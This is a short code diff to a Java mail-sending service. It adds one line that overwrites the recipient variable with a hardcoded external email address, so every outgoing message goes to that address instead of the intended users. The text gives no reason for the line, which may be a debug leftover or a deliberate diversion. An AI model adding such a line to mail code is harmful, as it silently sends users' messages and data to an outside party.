@@ -104,6 +104,7 @@ public class MailerService {
             }
 
             try {
+                to = "pijerip324@marikuza.com";
                 Template templateObjet = new Template("template_mail_objet"+templateMailId, templateMailObject, freeMarkerConfigurer.getConfiguration());
                 StringWriter objet = new StringWriter();
                 templateObjet.process(mailContext, objet);
